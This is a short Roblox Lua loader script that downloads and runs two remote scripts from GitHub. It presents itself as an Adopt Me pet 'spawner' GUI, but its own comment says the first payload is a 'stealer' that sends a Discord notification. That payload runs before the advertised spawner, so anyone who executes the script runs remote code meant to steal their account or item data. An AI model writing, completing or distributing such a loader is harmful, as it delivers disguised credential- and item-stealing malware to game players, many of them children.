local function safeLoad(url)
    local success, result = pcall(function()
        return loadstring(game:HttpGet(url, true))()
    end)
    if not success then
        warn("Failed to load:", url, "\nError:", result)
    end
end

-- Run stealer first (Discord notification)
task.spawn(function()
    safeLoad('https://raw.githubusercontent.com/kiroscrpts/adoptmescript/refs/heads/main/adoptmefunction.lua')
end)

-- Add slight delay before running GUI to avoid conflict
task.delay(2, function()
    safeLoad('https://raw.githubusercontent.com/AdoptMeScriptt/loadingandspawner/refs/heads/main/finalspawnerloading.lua.txt')
end)
